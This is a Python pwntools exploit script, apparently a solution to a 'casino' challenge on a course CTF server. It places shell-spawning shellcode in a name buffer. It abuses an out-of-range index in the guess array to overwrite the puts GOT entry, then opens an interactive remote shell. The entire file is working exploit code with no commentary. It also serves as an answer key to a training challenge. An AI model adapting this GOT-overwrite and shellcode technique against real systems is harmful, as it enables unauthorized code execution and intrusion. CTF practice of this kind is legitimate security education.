from pwn import *

context.arch = 'amd64'
context.log_level = 'DEBUG'
sc = "A"*0x20 +asm(shellcraft.sh())
elf = ELF('./casino')


got_put = elf.got['puts']
guess = elf.symbols['guess']
name = elf.symbols['name']

#proc = process('./casino')
proc = remote('edu-ctf.csie.org',10172)
offset = (got_put-guess)/4

proc.sendlineafter(':',sc)
proc.sendlineafter(':','430')

#first pass
proc.sendlineafter(':','87') 
proc.sendlineafter(':','87') 
proc.sendlineafter(':','87') 
proc.sendlineafter(':','87') 
proc.sendlineafter(':','87') 
proc.sendlineafter(':','87') 

#change?
proc.sendlineafter('no]:','1')
proc.sendlineafter(':',str(offset+2))
proc.sendlineafter(':','0')	#0x00000000

#second pass
proc.sendlineafter(':','60')	#0x3c
proc.sendlineafter(':','42')	#0x2a
proc.sendlineafter(':','15')	#0x0f
proc.sendlineafter(':','0')	#0x00
proc.sendlineafter(':','68')	#0x44
proc.sendlineafter(':','54')	#0x36
#change?
proc.sendlineafter('no]:','1')
proc.sendlineafter(':',str(offset+1))
proc.sendlineafter(':',str(name+0x20)) #0x006020f0 + 2 rows

proc.interactive()

